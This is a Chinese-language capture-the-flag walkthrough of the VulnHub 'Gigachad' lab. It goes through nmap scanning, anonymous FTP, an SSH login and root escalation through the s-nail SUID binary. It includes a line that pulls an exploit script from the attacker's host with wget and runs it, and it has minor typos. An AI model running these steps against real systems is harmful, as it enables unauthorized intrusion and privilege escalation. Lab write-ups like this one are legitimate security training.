@@ -1,0 +1,403 @@
+## 复盘*
+
+## 靶机地址
+
+[Gigachad: 1 ~ VulnHub](https://www.vulnhub.com/entry/gigachad-1,657/)
+
+![image-20250314175958802](assets/image-20250314175958802.png)
+
+
+
+## 信息收集
+
+
+
+### nmap扫描
+
+#### 准备阶段
+
+```
+mkdir nmapscan
+```
+
+![image-20250314180435689](assets/image-20250314180435689.png)
+
+
+
+#### 主机探活
+
+```
+sudo nmap -sn 192.168.1.0/24
+```
+
+![image-20250314180504557](assets/image-20250314180504557.png)
+
+确定靶机ip
+
+192.168.1.9
+
+
+
+#### 端口扫描
+
+```
+sudo nmap -sT --min-rate 10000 -p- 192.168.1.9 -oA nmapscan/ports
+```
+
+![image-20250314180610228](assets/image-20250314180610228.png)
+
+开放了：
+
+- 21 ftp
+- 22 ssh
+- 80 http
+
+
+
+#### 提取端口信息
+
+```
+ ports=$(cat nmapscan/ports.nmap | grep open | awk -F/ '{print $1}' | paste -sd,)
+ echo $ports
+```
+
+![image-20250314180634544](assets/image-20250314180634544.png)
+
+
+
+#### 详细结果扫描
+
+```
+sudo namp -sV -sC -sT -p 21,22,80 192.168.1.9 -oA nmapscan/detail
+```
+
+![image-20250314180814737](assets/image-20250314180814737.png)
+
+分析：
+
+- 21 ftp服务，允许匿名（anonymous）登录
+- 22 ssh服务，OpenSSH 2.4.38
+- 80 http服务，Apache服务器
+
+
+
+#### udp扫描
+
+```
+sudo nmap -sU --top-ports 20 192.168.1.9 -oA nmapscan/udp
+```
+
+![image-20250314191648785](assets/image-20250314191648785.png)
+
+
+
+
+
+### 21端口
+
+#### 匿名登陆
+
+```
+ftp 192.168.1.9
+anonymous
+```
+
+![image-20250314191949715](assets/image-20250314191949715.png)
+
+#### 切换二进制模式
+
+```
+binary
+```
+
+![image-20250314192026353](assets/image-20250314192026353.png)
+
+
+
+#### 下载文件
+
+```
+ls
+get chadinfo
+exit
+```
+
+![image-20250314192056996](assets/image-20250314192056996.png)
+
+
+
+#### 检测文件类型
+
+```
+ls
+file chadinfo
+```
+
+![image-20250314192115278](assets/image-20250314192115278.png)
+
+zip文件
+
+
+
+#### 解压文件
+
+```
+unzip chadinfo
+```
+
+![image-20250314192141152](assets/image-20250314192141152.png)
+
+
+
+#### 查看文件
+
+```
+cat chadinfo
+```
+
+![image-20250314192208931](assets/image-20250314192208931.png)
+
+提示用户名为
+
+- chad
+
+密码在/dripphinchad.png
+
+
+
+
+
+### 80端口
+
+#### 下载图片
+
+```
+wget 192.168.1.9/drippinchad.png
+```
+
+![image-20250314192327196](assets/image-20250314192327196.png)
+
+![image-20250314192356569](assets/image-20250314192356569.png)
+
+png图片
+
+
+
+
+
+#### exiftool检测
+
+```
+exiftool drippinchad.png
+```
+
+![image-20250314192506643](assets/image-20250314192506643.png)
+
+无结果
+
+
+
+
+
+#### binwalk检测
+
+```
+binwalk drippinchad.png
+```
+
+![image-20250314192842822](assets/image-20250314192842822.png)
+
+无结果
+
+
+
+#### 访问192.168.1.9
+
+![image-20250314193257501](assets/image-20250314193257501.png)
+
+
+
+查看源码
+
+![image-20250314193315918](assets/image-20250314193315918.png)
+
+
+
+#### hash-identifier识别哈希
+
+![image-20250314193351916](assets/image-20250314193351916.png)
+
+SHA-1
+
+
+
+#### 破解SHA-1
+
+[CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
+
+![image-20250314193731864](assets/image-20250314193731864.png)
+
+？？？
+
+![image-20250314193839338](assets/image-20250314193839338.png)
+
+
+
+
+
+#### dirsearch扫描目录
+
+```
+sudo dirsearch -u 192.168.1.9
+```
+
+![image-20250314193930283](assets/image-20250314193930283.png)
+
+很多干扰信息
+
+
+
+
+
+#### 从图片入手
+
+![image-20250314194340154](assets/image-20250314194340154.png)
+
+```
+Why yes, this is my favorite place to relax
+是的，这是我最喜欢放松的地方
+
+How could you tell?
+你怎么知道？
+```
+
+
+
+#### ai识别图片地点
+
+地点为：土耳其伊斯坦布尔的少女塔（Maiden's Tower）
+
+```
+maidenstower
+```
+
+
+
+### 22端口
+
+#### ssh登录
+
+```
+ssh chad@192.168.1.9
+```
+
+![image-20250314194831037](assets/image-20250314194831037.png)
+
+
+
+## 提权
+
+### 得到第一个flag
+
+```
+ls
+cat user.txt
+```
+
+![image-20250314194908507](assets/image-20250314194908507.png)
+
+
+
+### 尝试sudo -l
+
+```
+sudo -l
+```
+
+![image-20250314195015604](assets/image-20250314195015604.png)
+
+没有sudo命令
+
+
+
+
+
+### 查找suid位
+
+```
+find / -user root -perm -4000 2>/dev/null
+```
+
+![image-20250314195614193](assets/image-20250314195614193.png)
+
+
+
+### 执行/usr/lib/s-nail/s-nail-privsep
+
+```
+/usr/lib/s-nail/s-nail-privsep
+```
+
+![image-20250314195638204](assets/image-20250314195638204.png)
+
+s-nail
+
+
+
+### 搜索漏洞
+
+```
+searchsploit s-nail
+```
+
+![image-20250314195740398](assets/image-20250314195740398.png)
+
+有一个本地提权漏洞
+
+
+
+
+
+### 保存到本地
+
+```
+searchsploit -m multiple/local/47172.sh
+```
+
+![image-20250314195846057](assets/image-20250314195846057.png)
+
+
+
+
+
+### 上传
+
+```
+ wget 192.168.1.3/47172.sh
+```
+
+![image-20250314195920888](assets/image-20250314195920888.png)
+
+
+
+### 执行
+
+```
+bash 47172.sh
+```
+
+![image-20250314200250784](assets/image-20250314200250784.png)
+
+![image-20250314200305385](assets/image-20250314200305385.png)
+
+
+
+### 查看flag
+
+```
+cd /root
+ls
+cat root.txt
+```
+
+![image-20250314200342261](assets/image-20250314200342261.png)
